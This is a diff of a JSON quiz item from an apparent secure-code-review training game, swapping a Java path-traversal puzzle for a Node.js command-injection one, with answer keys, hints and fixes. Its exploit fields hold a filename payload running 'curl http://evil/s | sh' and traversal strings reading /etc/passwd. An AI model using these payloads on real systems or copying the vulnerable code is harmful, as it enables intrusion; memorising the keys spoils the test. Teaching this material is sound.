@@ -1,55 +1,53 @@
 {
-  "id": "srd-0017",
+  "id": "srd-0020",
   "date": "2026-10-15",
   "difficulty": "medium",
-  "language": "java",
+  "language": "javascript",
   "estimatedMinutes": 15,
   "snippet": {
     "files": [
       {
-        "name": "FileController.java",
-        "code": "import java.nio.file.*;\n\n@GetMapping(\"/files\")\npublic ResponseEntity<byte[]> get(@RequestParam String name) throws IOException {\n    Path base = Paths.get(\"/var/data/files\");\n    Path target = base.resolve(name);\n    byte[] body = Files.readAllBytes(target);\n    return ResponseEntity.ok(body);\n}",
+        "name": "thumbnail.js",
+        "code": "const { exec } = require(\"child_process\");\n\nfunction makeThumbnail(file, cb) {\n  // Resize an uploaded image using ImageMagick.\n  const out = file + \".thumb.png\";\n  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n  exec(cmd, cb);\n}\n\nmodule.exports = makeThumbnail;",
         "notes": {
-          "4": "Handler taking a `name` request parameter — attacker-controlled.",
-          "5": "The directory files are supposed to come from.",
-          "6": "Resolves `name` against the base directory to form the target path.",
-          "7": "Reads the entire file at that path.",
-          "8": "Returns its bytes to the client."
+          "3": "Called with the path of an uploaded image (the filename is attacker-influenced).",
+          "5": "Derives the output thumbnail path.",
+          "6": "Builds the shell command string with `file` concatenated in.",
+          "7": "`exec` runs that command string through /bin/sh."
         }
       }
     ]
   },
   "stages": {
     "line": {
-      "file": "FileController.java",
-      "line": 6,
+      "file": "thumbnail.js",
+      "line": 7,
       "yellowRadius": 2,
       "maxGuesses": 5
     },
     "bugClass": {
-      "answer": "path-traversal",
+      "answer": "command-inj",
       "options": [
+        "command-inj",
+        "code-inj",
         "path-traversal",
-        "zip-slip",
-        "idor",
         "ssrf",
-        "xxe",
-        "missing-authz"
+        "sqli"
       ]
     },
     "why": {
-      "answerIndex": 0,
+      "answerIndex": 2,
       "options": [
         {
-          "label": "`base.resolve(name)` with `../` segments — or an absolute `name`, which replaces the base entirely — produces a path outside `base`, which is then read"
+          "label": "`convert` is CPU-heavy, so repeated calls exhaust the server",
+          "whyWrong": "Resource cost isn't the vulnerability; the shell interpreting the filename is."
         },
         {
-          "label": "`readAllBytes` loads the whole file into memory, risking exhaustion",
-          "whyWrong": "A large-file DoS is a different concern; the flaw is reading a file outside the intended directory."
+          "label": "The thumbnail path is predictable, letting attackers find it",
+          "whyWrong": "Predictable output names are minor next to command execution."
         },
         {
-          "label": "`@RequestParam` without `required=false` throws when absent",
-          "whyWrong": "Parameter presence is unrelated to the traversal."
+          "label": "`exec` runs the string in a shell and `file` (an attacker-influenced upload name) is concatenated in, so shell metacharacters execute"
         }
       ]
     },
@@ -57,18 +55,23 @@
       "answerIndex": 1,
       "options": [
         {
-          "label": "Reject name if it contains '..'",
-          "diff": "+    if (name.contains(\"..\")) throw new AccessDeniedException(name);\n     Path target = base.resolve(name);",
-          "whyWrong": "Misses absolute paths and encoded forms; blocklisting is fragile."
+          "label": "Wrap file in single quotes inside the command",
+          "diff": "-  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n+  const cmd = \"convert '\" + file + \"' -resize 200x200 '\" + out + \"'\";",
+          "whyWrong": "A single quote in the filename closes the quote and resumes command context."
         },
         {
-          "label": "Normalize the resolved path and confirm it stays under base",
-          "diff": "-    Path target = base.resolve(name);\n+    Path target = base.resolve(name).normalize();\n+    if (!target.startsWith(base)) throw new AccessDeniedException(name);"
+          "label": "Use execFile('convert', [file, '-resize', '200x200', out]) so no shell parses the arguments",
+          "diff": "-  const { exec } = require(\"child_process\");\n+  const { execFile } = require(\"child_process\");\n-  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n-  exec(cmd, cb);\n+  execFile(\"convert\", [file, \"-resize\", \"200x200\", out], cb);"
         },
         {
-          "label": "Catch IOException and return 404",
-          "diff": "+    try {\n     byte[] body = Files.readAllBytes(target);\n+    } catch (IOException e) { return ResponseEntity.notFound().build(); }",
-          "whyWrong": "Error handling doesn't confine the path; an existing file outside base is still served."
+          "label": "Strip spaces from file",
+          "diff": "+  file = file.replace(/ /g, \"\");",
+          "whyWrong": "Metacharacters like `;`, `|`, `&&`, `$()` and backticks need no spaces."
+        },
+        {
+          "label": "Reject filenames not ending in a known image extension",
+          "diff": "+  if (!/\\.(png|jpg)$/.test(file)) throw new Error(\"bad file\");",
+          "whyWrong": "`x.jpg;id #.png` passes a suffix check and still injects; the shell is still involved."
         }
       ]
     }
@@ -79,28 +82,28 @@
     "attribution": "SourceReadle original"
   },
   "training": {
-    "exploit": "Request `?name=../../../../etc/passwd` to climb out of `/var/data/files`, or `?name=/etc/passwd` — Java's `resolve` of an absolute path discards the base. Either reads an arbitrary file.",
+    "exploit": "Upload a file whose name is `x.jpg; curl http://evil/s | sh #`. When the thumbnailer runs, the shell executes `convert x.jpg ...` and then the injected command. Upload filenames are attacker-controlled, so no other input is needed.",
     "concepts": [
-      "CWE-22",
-      "OWASP A01:2021"
+      "CWE-78",
+      "OWASP A03:2021"
     ],
     "hints": {
-      "line": "Where does user input join a filesystem path?",
-      "bugClass": "Input steers which path is read.",
-      "why": "What does resolve() do with `..` or an absolute path?",
-      "fix": "Normalize and verify the result is still under base."
+      "line": "Which call hands a built string to a shell?",
+      "bugClass": "The filename reaches the OS shell.",
+      "why": "What parses `file` on line 7 — the program, or /bin/sh?",
+      "fix": "Pass arguments as an array with no shell."
     }
   },
   "writeup": {
-    "summary": "`base.resolve(name)` trusts `name`: `../` segments climb out of the base directory, and an absolute `name` makes `resolve` return that absolute path outright, discarding the base. `readAllBytes` then returns any file the process can read. The fix normalizes the resolved path and checks `startsWith(base)` before reading, so anything that escapes is rejected.",
+    "summary": "`exec` runs its argument through `/bin/sh`, and `file` — an attacker-influenced upload name — is concatenated into that string, so shell metacharacters in the name execute commands. `execFile('convert', [file, ...])` spawns the binary directly with `file` as one argument; there is no shell to interpret `;`, `|`, `$()`, or backticks. Quoting and suffix checks are bypassable.",
     "readNext": [
       {
-        "label": "Java Path.resolve / normalize",
-        "url": "https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/nio/file/Path.html"
+        "label": "Node child_process: exec vs execFile",
+        "url": "https://nodejs.org/api/child_process.html"
       },
       {
-        "label": "OWASP Path Traversal",
-        "url": "https://owasp.org/www-community/attacks/Path_Traversal"
+        "label": "OWASP Command Injection",
+        "url": "https://owasp.org/www-community/attacks/Command_Injection"
       }
     ]
   }
